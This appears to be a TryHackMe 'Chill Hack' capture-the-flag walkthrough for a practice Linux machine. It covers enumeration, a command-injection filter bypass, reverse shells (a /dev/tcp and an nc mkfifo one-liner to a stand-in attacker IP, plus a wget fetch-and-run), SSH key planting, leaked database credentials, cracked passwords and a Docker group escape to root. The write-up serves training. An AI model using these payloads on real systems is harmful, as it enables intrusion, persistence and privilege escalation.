
# Chill Hack - TryHackMe Walkthrough

## Room Information
- **Link:** https://tryhackme.com/room/chillhack
- **Difficulty:** Easy
- **OS:** Linux
- **Target IP:** 10.49.179.213

## Scenario
This room provides real-world pentesting challenges involving command injection, lateral movement, and privilege escalation.

## Attack Overview
1. Enumeration (Nmap, FTP, Gobuster)
2. Command Injection with Filter Bypass
3. Reverse Shell
4. Lateral Movement (.helpline.sh)
5. Port Forwarding & Web Portal
6. Steganography
7. Docker Escape for Root

---

## Phase 1: Enumeration

### Nmap Scan
```bash
nmap -sC -sV -T4 10.49.179.213
```

**Results:**
| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 (Anonymous login allowed) |
| 22/tcp | SSH | OpenSSH 7.6p1 |
| 80/tcp | HTTP | Apache 2.4.29 |

### FTP Enumeration
```bash
ftp 10.49.179.213
# Username: anonymous
# Password: (empty)
```

**Commands:**
```
ls
get note.txt
```

**note.txt Content:**
```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

**Key Findings:**
- Two potential users: Anurodh and Apaar
- Some command filtering is in place

### Web Enumeration
```bash
gobuster dir -u http://10.49.179.213 -w /usr/share/wordlists/dirb/common.txt
```

**Discovered Directories:**
- /images
- /css
- /js
- /secret

---

## Phase 2: Initial Foothold

### Command Injection on /secret
Navigate to: `http://10.49.179.213/secret/`

The page allows command execution but filters certain strings.

**Filter Bypass Techniques:**

| Command | Filtered | Bypass |
|---------|----------|--------|
| ls | Blocked | `l's'` or `l\s` |
| cat | Blocked | `c'at` or `c\at` |

**Successful Commands:**
```bash
# List files
l's' -la

# View index.php source
c'at' index.php

# Read /etc/passwd
c'at' /etc/passwd
```

**index.php Source Code (Key Parts):**
```php
$blacklist = array('nc', 'python', 'bash', 'php', 'perl', 'rm', 'cat', 
                   'head', 'tail', 'python3', 'more', 'less', 'sh', 'ls');
```

### Reverse Shell

**Method 1: Using wget to download and execute**
```bash
# On attacker machine - start HTTP server
python3 -m http.server 8000

# Create shell.sh
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"' > shell.sh

# On target (bypass filter)
w'get' http://YOUR_IP:8000/shell.sh -O /tmp/sh.sh;b'ash' /tmp/sh.sh
```

**Method 2: Direct reverse shell**
```bash
# Start listener
nc -lvnp 4444

# Execute (filter bypass)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
```

**Stabilize Shell:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z, then type: stty raw -echo; fg
```

---

## Phase 3: Lateral Movement to apaar

### Local Enumeration
```bash
# Current user
whoami
# www-data

# Users on system
cat /etc/passwd | grep -v nologin

# Home directories
ls /home
# anurodh  apaar  aurick

# Check sudo permissions
sudo -l
```

**Sudo Permissions Found:**
```
User www-data may run the following commands on ubuntu:
    (apaar) NOPASSWD: /home/apaar/.helpline.sh
```

### Exploit .helpline.sh
```bash
sudo -u apaar /home/apaar/.helpline.sh
```

When prompted for input, use:
```
/usr/bin/script -qc /bin/bash /dev/null
```

**Result:** Shell as apaar

### User Flag
```bash
cat /home/apaar/local.txt
```

**USER FLAG:** `{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}`

---

## Phase 4: Internal Enumeration

### Check Open Ports
```bash
ss -tlnp
```

**Internal Services:**
| Port | Service |
|------|---------|
| 9001 | HTTP (localhost only) |
| 3306 | MySQL (localhost only) |

### Port Forwarding
```bash
# Generate SSH key (on attacker)
ssh-keygen -t rsa -f apaar_rsa

# Copy public key to target
echo "YOUR_PUBLIC_KEY" >> /home/apaar/.ssh/authorized_keys

# SSH with port forwarding
ssh -L 9001:127.0.0.1:9001 -i apaar_rsa apaar@10.49.179.213
```

### Web Portal Analysis
Access: `http://localhost:9001/`

**Files Found in /var/www/files/:**
- index.php
- source_code.php
- hacker.php

**source_code.php - MySQL Credentials:**
```php
$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
```

**MySQL Access:**
```bash
mysql -u root -p!@m+her00+@db -e "use webportal; select * from users;"
```

**Users Table:**
| Name | Username | Password (MD5) |
|------|----------|----------------|
| Anurodh Acharya | Aurick | 7e53614ced3640d5de23f111806cc4fd |
| Apaar Dahal | cullapaar | 686216240e5af30df0501e53c789a649 |

**Cracked Passwords:**
- Aurick: `masterpassword`
- cullapaar: `dontaskdonttell`

---

## Phase 5: Steganography

### Download Images
```bash
# From /var/www/html/images/
scp -i apaar_rsa apaar@10.49.179.213:/var/www/html/images/* .
```

### Extract Hidden Data
```bash
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

**Extracted File:** `info.txt`

**info.txt Content (Base64):**
```
IWQwbnRLbjB3bVlwQHNzdzByZA==
```

**Decode:**
```bash
echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
```

**Result:** `!d0ntKn0wmYp@ssw0rd`

---

## Phase 6: SSH as anurodh

### Connect
```bash
ssh anurodh@10.49.179.213
# Password: !d0ntKn0wmYp@ssw0rd
```

### Check Privileges
```bash
id
# uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

**Key Finding:** User is in docker group!

---

## Phase 7: Docker Escape for Root

### Method: Mount Root Filesystem
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**Result:** Root shell

### Root Flag
```bash
cat /root/proof.txt
```

**ROOT FLAG:** `{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}`

---

## Summary

### Attack Chain
```
FTP Anonymous → Note with clues
     ↓
Gobuster → /secret directory
     ↓
Command Injection → Filter Bypass
     ↓
Reverse Shell (www-data)
     ↓
Sudo .helpline.sh → apaar
     ↓
Port Forwarding → Internal Web Portal
     ↓
MySQL Credentials → Steganography
     ↓
SSH as anurodh (docker group)
     ↓
Docker Escape → Root
```

### Flags Collected
| Flag | Value |
|------|-------|
| User | `{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}` |
| Root | `{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}` |

### Key Techniques Used
1. **Enumeration:** Nmap, Gobuster, netstat
2. **Filter Bypass:** Single quotes, backslash escaping
3. **Reverse Shell:** wget download, mkfifo
4. **Privilege Escalation:** sudo scripts, docker group
5. **Port Forwarding:** SSH local forwarding
6. **Steganography:** steghide extraction
7. **Docker Escape:** Volume mount to /mnt

### Tools Used
| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Directory enumeration |
| netcat | Reverse shell listener |
| steghide | Steganography extraction |
| ssh | Port forwarding, remote access |
| docker | Privilege escalation |

---

## Troubleshooting

### Issue: Command injection blocked
- Use single quotes: `l's' -la`
- Use backslash: `c\at file`
- Check blacklist in index.php

### Issue: Reverse shell not working
- Try different payloads
- Ensure listener is running
- Check for firewall rules

### Issue: Port forwarding not working
- Verify SSH key is correctly added
- Check if port 9001 is actually open
- Try with -N flag for no command

---
